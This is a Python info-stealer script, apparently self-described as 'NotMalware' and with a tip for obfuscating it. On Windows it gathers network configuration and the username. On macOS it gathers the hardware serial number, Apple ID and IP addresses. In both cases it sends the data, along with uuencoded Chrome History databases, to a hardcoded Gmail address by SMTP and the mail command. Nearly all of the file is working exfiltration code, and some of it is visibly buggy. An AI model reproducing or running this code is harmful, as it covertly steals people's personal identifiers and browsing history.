import platform
import subprocess
import smtplib
import ssl
import sys
import subprocess
import os
import socket
import getpass

##To Obfuscate: python3.8 -OO -m py_compile NotMalware.py
print('hi')
def main(platform):
    def windows():
        p = subprocess.Popen("nslookup myip.opendns.com resolver1.opendns.com", stdout=subprocess.PIPE, shell=True)

        (output, err) = p.communicate()

        p_status = p.wait()
        

        p = subprocess.Popen("ipconfig/all", stdout=subprocess.PIPE, shell=True)

        (output2, err) = p.communicate()

        p_status1 = p.wait()
        output = f'\n{output}\n.\n.\n.\n.\n.\n.{output2}'
        output = f'{output}'
        output = output.replace('\\n', '\n')
        output = output.replace('\\r', '')
        output = output.replace("b'", '')
        output = output.replace("'", '')

        #print (output)
        #print (f'{p_status} {p_status}')

        port = 465  # For SSL

        smtp_server = "smtp.gmail.com"
        sender_email = "SVBBZGRy@gmail.com"  # Enter your address
        receiver_email = "SVBBZGRy@gmail.com"  # Enter receiver address
        password = 'SVBBZGRy'

        subject = 'test'
        message = f'{output}\n{p_status} {p_status}'
        p = subprocess.Popen("whoami", stdout=subprocess.PIPE, shell=True)

        (output3, err) = p.communicate()
        print (output3)
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message, subject)
        #C: \Users\User\AppData\Local\Google\Chrome\User Data\Default
        for i in range(100):  # Loops through 10 profiles and aggregates History databases
            try:
                os.chdir(f"/Users/{whoami}/Library/Application Support/Google/Chrome/Profile {i}/")
                os.system(f"uuencode History Profile{i}History.db | mail -s 'Chrome Mine for Profile {i} from {whoami}' SVBBZGRy@gmail.com")
            except:
                pass

    def mac():
        cmd = "system_profiler SPHardwareDataType | grep 'Serial Number' | awk '{print $4}'" ##Cmd to get priv IP   
        result = subprocess.run(cmd, stdout=subprocess.PIPE, shell=True, check=True)    ##Get private IP from Terminal cmd
        serialNum = result.stdout.strip()   ##Get result from terminal cmd
        cmd = '/usr/libexec/PlistBuddy -c "print :Accounts:0:AccountID" ~/Library/Preferences/MobileMeAccounts.plist' ##Cmd to get AppleID
        result = subprocess.run(cmd, stdout=subprocess.PIPE, shell=True, check=True)    ##Get AppleID from Terminal cmd
        appleID = result.stdout.strip()    
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"]) ##Installs dependency modules
        from requests import get
        publicIP = get('https://api.ipify.org').text
        hostname = socket.gethostname()
        privateIP = socket.gethostbyname(hostname)
        whoami = getpass.getuser()
        toSend = f"Private IP = {privateIP} Public IP = {publicIP} https://www.home.neustar/resources/tools/ip-geolocation-lookup-tool Serial Num = {serialNum} AppleID = {appleID}"
        os.system('echo ' + toSend + f' | mail -s "Data Mine from {whoami}" SVBBZGRy@gmail.com') 
        
        for i in range(100): ##Loops through 10 profiles and aggregates History databases
            try:
                os.chdir(f"/Users/{whoami}/Library/Application Support/Google/Chrome/Profile {i}/")
                os.system(f"uuencode History Profile{i}History.db | mail -s 'Chrome Mine for Profile {i} from {whoami}' SVBBZGRy@gmail.com")
            except:
                pass
        
    if platform == "linux" or platform == "linux2":
        print('linux')
        exit()
    elif platform == "Darwin":
        mac()
    elif platform == "win32" or platform == "Windows":
        print('windows')
        windows()



